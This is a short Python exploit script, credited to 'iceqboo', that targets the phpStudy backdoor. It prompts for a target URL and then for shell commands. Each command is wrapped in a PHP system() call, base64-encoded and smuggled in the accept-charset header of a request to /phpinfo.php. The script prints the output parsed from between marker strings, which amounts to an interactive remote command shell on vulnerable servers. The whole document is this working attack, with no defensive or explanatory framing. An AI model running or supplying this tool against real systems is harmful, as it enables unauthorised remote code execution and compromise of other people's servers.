#!/usr/bin/env python3
#-*- encoding:utf-8 -*-
# by: iceqboo

import base64
import requests
import sys,re


url = input('input url:')

print("======Phpstudy Backdoor Exploit============\n")
print("===========By  iceqboo=================\n")




def os_shell(url,headers,payload):
    try:
        r = requests.get(url=url+'/phpinfo.php',headers=headers,verify=False,timeout=10)
        # print(r.text)
        res = re.findall("iceqboo(.*?)iceqboo",r.text,re.S)
        print("[ + ]===========The Response:==========[ + ]")
        res = "".join(res)
        print(res)
    except:
        print("[ - ]===========Failed! Timeout...==========[ - ]\n")



while True:
    de_payload = input('input:')
    payload = "echo \"iceqboo\";echo system(\"" + de_payload + "\");echo \"iceqboo\";"
    payload = base64.b64encode(payload.encode('utf-8'))
    payload = str(payload, 'utf-8')
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'accept-charset': payload,
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
    }
    os_shell(url=url, headers=headers, payload=payload)